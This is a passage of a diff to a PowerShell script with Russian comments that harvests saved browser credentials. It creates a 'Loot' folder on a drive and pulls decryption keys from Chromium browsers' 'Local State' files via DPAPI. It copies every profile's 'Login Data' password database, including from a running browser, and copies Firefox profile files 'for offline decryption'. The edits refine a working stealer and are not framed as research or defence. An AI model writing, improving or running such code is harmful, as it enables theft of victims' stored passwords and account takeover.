@@ -6,7 +6,7 @@ $u = "$($u):"
 # 2. Создание папки назначения
 $dest = "$u\Loot_$(Get-Date -f HHmm)"
 cmd /c "mkdir $dest 2>nul"
-$logPath = "$dest\REPORT.txt"
+$report = "$dest\REPORT.txt"
 
 # Подгружаем сборку для работы с DPAPI
 Add-Type -AssemblyName System.Security
@@ -43,23 +43,36 @@ $browsers = @(
 foreach ($b in $browsers) {
     $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
     if (Test-Path $userDataPath) {
-        # Поиск всех файлов "Login Data" во всех профилях
+        # Ищем Local State для получения ключа
+        $localState = Join-Path $userDataPath "Local State"
+        
+        # Ищем все файлы Login Data (базы) во всех профилях
         $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
+        
         foreach ($file in $foundFiles) {
+            # Определяем имя профиля (напр. Default или Profile 1)
             $profileName = $file.Directory.Name
-            $localState = Join-Path $userDataPath "Local State"
             $label = "$($b.name)_$($profileName)"
             
+            # Сначала пытаемся получить ключ
             if (Get-Key $localState $label $dest) {
-                # Копирование базы через xcopy (флаг /y подтверждает замену, /q скрывает вывод)
-                # Это позволяет копировать файлы, даже если браузер запущен
-                cmd /c "xcopy /y /q `"$($file.FullName)`" `"$dest\$($label)_db`""
+                # Копируем базу. Используем cmd /c xcopy для максимальной стабильности
+                # Флаг /Y — подавление запроса на подтверждение перезаписи
+                # Флаг /H — копирование скрытых и системных файлов
+                # Флаг /C — продолжение копирования даже при возникновении ошибок
+                $targetFile = "$dest\$($label)_db"
+                cmd /c "xcopy /Y /H /C `"$($file.FullName)`" `"$dest\`"" 
+                
+                # Переименовываем скопированный файл для идентификации
+                if (Test-Path "$dest\Login Data") {
+                    Rename-Item -Path "$dest\Login Data" -NewName "$($label)_db" -Force
+                }
             }
         }
     }
 }
 
-# 4. СБОР FIREFOX (Файлы для офлайн-дешифровки)
+# 4. СБОР FIREFOX
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ffPath) {
     cmd /c "mkdir $dest\FF 2>nul"
@@ -69,10 +82,9 @@ if (Test-Path $ffPath) {
         foreach ($f in $files) {
             $src = Join-Path $_.FullName $f
             if (Test-Path $src) {
-                cmd /c "copy /y `"$src`" `"$dest\FF\$($label)_$f`""
+                cmd /c "copy /Y `"$src`" `"$dest\FF\$($label)_$f`""
             }
         }
-        "[$label] Firefox profile files copied." >> $logPath
     }
 }
 
